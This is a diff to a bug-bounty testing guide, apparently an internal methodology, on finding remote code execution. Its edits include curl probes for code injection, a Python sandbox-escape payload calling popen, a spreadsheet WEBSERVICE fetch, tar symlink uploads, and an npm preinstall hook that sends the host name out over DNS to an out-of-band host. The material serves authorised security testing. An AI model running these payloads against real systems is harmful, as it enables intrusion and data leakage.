@@ -33,8 +33,10 @@ expression leaves its vocabulary: a sift `$where` GraphQL filter ($12,000, #3782
 argument ($7,000, #3694007), PHP code injection on a sub-brand host ($3,000, #798135).
 
 Be honest about the rest of `kb/reports/rce.md`. Of the 111 paid reports, 15 were paid by Internet Bug Bounty for
-runtime and library CVEs and five are GitHub Security Lab queries and Shopify's mruby sandbox; much of the unpaid
-remainder is desktop, mobile and game clients that run code on a user's machine. The third-largest bounty,
+runtime and library CVEs and five are GitHub Security Lab queries and Shopify's mruby sandbox. Much of the unpaid
+remainder is not a web target either: library and command-line tool bugs (the Node.js third-party modules
+programme alone disclosed 63, curl 18) and desktop, browser and game clients that run code on a user's machine.
+The third-largest bounty,
 dependency confusion on internal package names ($30,000, #925585; also #1043385, #1007014, #1104874), is the
 client-side chapter's programme-level item, and Log4Shell header spraying belongs to DSR-004 and CVE-016.
 
@@ -179,7 +181,8 @@ sort expressions) → RCE-006 (markup and diagram renderers) → RCE-009 (docume
   asynchronously; and the values a later job puts on a command line, which no timing test reaches: names that a
   background export, archive or thumbnail job uses (#214022, a user name in an archive export), uploaded file
   names, project, branch and display names, webhook and integration settings, headers that a logging or analytics
-  script processes (#1339430, a header). Inject, then start the job (export, archive, regenerate, re-index) and
+  script processes (#1339430, the User-Agent, which we test only when the programme does not prescribe its own).
+  Inject, then start the job (export, archive, regenerate, re-index) and
   wait: queues run minutes later.
 - **Test:** inject a command substitution that resolves `$(hostname).<label>.$OOB`. Outbound HTTP is often
   filtered; the DNS resolver rarely is. The host name in front of our label is the proof: a WAF, mail scanner or
@@ -399,7 +402,7 @@ sort expressions) → RCE-006 (markup and diagram renderers) → RCE-009 (docume
   U="$T/api/calc"; P=expr; V=1                                # endpoint, parameter, its normal value
   e() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$2" "$U" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\n"; sleep "$W"; }
   e base "$V"; e mul '191*7'; e brk "'"
-  e php "'rce'.'005'"; e js "'rce'+'005'"; e py "'rce'+'%03d'%5"; e rb '"rce"<<"005"'
+  e php "'rce'.'005'"; e js "'rce'+0+0+5"; e py "'rce'+str(5).zfill(3)"; e rb '"rce"<<"005"'
   grep -aoE '1337|rce005|Parse error[^<]{0,80}|syntax error[^<]{0,80}|SyntaxError[^<]{0,80}|NameError[^<]{0,60}|unexpected [^<]{0,40}' "$D"/*.body | sort -u
   # one call that returns the host name, in the language that answered
   e php-host 'gethostname()'
@@ -521,15 +524,15 @@ sort expressions) → RCE-006 (markup and diagram renderers) → RCE-009 (docume
   mathjs before 3.17.0                            the CVE-2017-1001002 and CVE-2017-1001003 expressions; later mathjs refuses constructor access
   Python eval with emptied builtins               [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['popen']('hostname').read()
     (Traceback, NameError)
-  Painless (ScriptException, "painless")          no runtime access by design (allow-listed classes); read instead: doc['<field>'].value from a
-                                                  record of our second account B, written with a marker, returned to A's query
+  Painless (ScriptException, "painless")          no runtime access by design (allow-listed classes); read instead (needs two-accounts):
+                                                  doc['<field>'].value from a record of our second account B, written with a marker, in A's response
   spreadsheet engine (=7*191 computed in an       =WEBSERVICE("http://rce007-ws.OOB/") where the engine implements and recalculates it: a fetch, SSR chapter
     export, preview or API response)
   SpEL, OGNL, MVEL, JEXL in a rule field          the TPL chapter's expression-language item
   ```
 - **Proof:** step one's computed value and step two's host name (or its DNS lookup) from the expression, with
-  request and response saved. For a sandboxed engine such as Painless: B's marker value in A's response, with B's
-  record created by us and A's own query unable to return it through the documented fields.
+  request and response saved. For a sandboxed engine such as Painless (with `two-accounts`): B's marker value in
+  A's response, with B's record created by us and A's own query unable to return it through the documented fields.
 - **Not a finding when:** arithmetic and documented functions work: that is the feature. The engine refuses
   everything in step two with its own error ("not allowed", "cannot resolve symbol", "unknown function"). The
   formula runs in the user's own spreadsheet program after an export (CSV injection, client side:
@@ -602,6 +605,8 @@ sort expressions) → RCE-006 (markup and diagram renderers) → RCE-009 (docume
   date -u +%FT%TZ | tee "$D/sent-at.txt"
   for f in rce008-mvg.jpg rce008-gs.jpg rce008-exif.jpg; do up "$f"; done
   ```
+  Converter containers often lack `nslookup`: with no query after a few minutes, send the same three files once
+  more with `getent hosts` or `ping -c 1` in its place and a new label.
 - **Proof:** the DNS query `<host name>.rce008-<mvg|gs|exif>.$OOB` after the upload of that file, with the file
   and the upload request saved; step 0's image with the Ghostscript revision as supporting evidence.
 - **Not a finding when:** the upload is refused as an invalid image and no query arrives: the decoder is a
@@ -731,6 +736,8 @@ sort expressions) → RCE-006 (markup and diagram renderers) → RCE-009 (docume
       data = f'rce010 {tag} via link\n'.encode()
       f = tarfile.TarInfo(f'rce010-link/rce010-{tag}-link.txt'); f.size = len(data); t.addfile(f, io.BytesIO(data))
   PY
+  curl -sS "${HDR[@]}" $A -F "file=@$D/rce010-link.tar;type=application/x-tar" "$T/api/import" -o "$D/tar.resp" -w '%{http_code}\n'
+  curl -sS "${HDR[@]}" "$T/rce010-$TAG-link.txt" | grep "rce010 $TAG"     # the served directory the symlink named
   ```
   Execution, only when the programme asks for it and the landing directory runs a handler: one more archive whose
   single entry, at the depth that landed, is `rce010-$TAG.php` holding `<?php echo 'rce010-', 191*7, '-',
@@ -879,9 +886,9 @@ sort expressions) → RCE-006 (markup and diagram renderers) → RCE-009 (docume
 - **How:**
   ```bash
   D="$E/evidence/$H/RCE-013"; mkdir -p "$D/npm/package" "$D/py/rce013-probe-0.0.1" "$D/wp/rce013-probe"
-  # built with tar and zip only, so nothing runs on this machine; \$ keeps $(hostname) for the target
+  # built with tar and zip only, so nothing runs on this machine; each probe resolves one name with its own runtime
   cat > "$D/npm/package/package.json" <<EOF
-  {"name":"rce013-probe","version":"0.0.1","description":"authorised bug bounty test: one DNS lookup on install","scripts":{"preinstall":"nslookup \$(hostname).rce013-npm.$OOB || true"}}
+  {"name":"rce013-probe","version":"0.0.1","description":"authorised bug bounty test: one DNS lookup on install","scripts":{"preinstall":"node -e \"require('dns').lookup(require('os').hostname()+'.rce013-npm.$OOB',function(){})\""}}
   EOF
   tar czf "$D/rce013-probe-0.0.1.tgz" -C "$D/npm" package
   cat > "$D/py/rce013-probe-0.0.1/setup.py" <<EOF
